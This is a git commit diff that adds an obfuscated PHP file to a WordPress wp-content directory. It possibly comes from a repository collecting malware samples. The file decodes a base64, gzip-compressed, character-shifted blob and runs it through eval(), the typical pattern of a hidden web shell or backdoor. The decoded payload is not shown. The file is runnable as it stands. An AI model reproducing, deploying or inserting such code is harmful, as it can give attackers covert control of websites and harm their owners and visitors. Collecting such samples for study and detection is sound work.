9f378a84c5379c200c8ba8ee3ee7741ba07d5ab5
Stefan Pejcic <pejcha1994@gmail.com>
2023-03-06 17:39:31 +0100

    Create th3_alpha.php

---
+++ 06.03.2023/wp-content/th3_alpha.php
@@ -0,0 +1,11 @@
+<?php
+
+function iojiebpixvcpxolcnnor($wvedbpkhwvedolxeuamwm){
+$wvedbpkhwvedolxeuamwm=gzinflate(base64_decode($wvedbpkhwvedolxeuamwm));
+for($maqmnmdusnzxzfnllzsiwp=0;$maqmnmdusnzxzfnllzsiwp<strlen($wvedbpkhwvedolxeuamwm);$maqmnmdusnzxzfnllzsiwp++){
+    $wvedbpkhwvedolxeuamwm[$maqmnmdusnzxzfnllzsiwp] = chr(ord($wvedbpkhwvedolxeuamwm[$maqmnmdusnzxzfnllzsiwp])-1);
+    }
+    return $wvedbpkhwvedolxeuamwm;}
+eval(iojiebpixvcpxolcnnor('bVPbjpswEP0AvmLkRmuQtklURX3YAOlD04vUqpWy+xRFyMCwWAVMjVklXeXbO4awIVH8ZM+c4zkzPnZQa6UjjbXSRlbP7txbOg2ayMgSo0KW0nQhmYELsqGMO4m+rh+3vK0LJVK+8+DuDq5iEATAc5mmWHHwXh0HaGGSK2B+gpVBHfpx+FSJEh/YtM7rqLV715syP6bcLA7ZEs4s7meqMpCoQumAxYVI/jBo5D8M2IKFfNkhZeYOAn//2pCaTRuTfFJICuC0JpksMJUaAmBDiS5eir1NUZx/mHfrdG2fVWmXmn9cLMbxtkFtaZGVT4BJ9OX7j/Vmy2UpnpHvttwm+O4WxZT1TQbFo2vWqLfbBTwPzk12df7u7e2ndqeXSpcX0E+lesGofztMI4tyL2Te29u8K1KS01DApcw9qMSkmLjdmLwR0D4eA19ArjELLjWEIyds2gSbJmuL4gBPJx3w8JlsFF7N2FrDnw3MmSCfvFU7drsjFg2+Xkiw9tEllGhylQbMuoOBSIxUVcDeMcAqMYeazFS2hZG10GZmCe9TYQQLfVnVrYEeYYUwsEoC1j0B5a1jx5jedwNqOL2IoqVj3x6xuhKDd49jr5/bs663EAf30iydo7MKHX9F/8XpP9M3+gg0qfgAP3W0row0B5rHKvwP'));
+
+ ?>
